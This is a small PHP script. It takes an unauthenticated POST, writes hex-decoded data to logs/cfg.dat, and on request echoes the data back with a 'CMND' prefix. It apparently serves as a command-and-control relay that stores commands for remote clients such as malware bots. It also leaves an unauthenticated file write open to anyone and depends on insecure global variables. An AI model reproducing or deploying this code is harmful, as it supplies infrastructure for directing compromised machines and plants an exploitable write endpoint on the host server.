<?php
$filename="logs/cfg.dat" ;

if($user==""):
$user=$_POST['user'] ;
endif;

if($info==""):
$info=$_POST['info'];
endif;

if($user=="1"): //save
$info=decode_string($info);
$fh=fopen($filename,"w+");
fwrite($fh,"$info");
fclose($fh);
exit;
elseif($user=="0"): //load
$fh=fopen($filename,"r");
$cfgdata=fread($fh,filesize($filename));
fclose($fh);
echo "CMND$cfgdata";
exit;
endif;

function decode_string($string) {
    $bindata = '';
    for ($i=0;$i<strlen($string);$i+=2) {
        $bindata.=chr(hexdec(substr($string,$i,2)));
    }
    return str_replace('"', '\'', $bindata);
}

?>
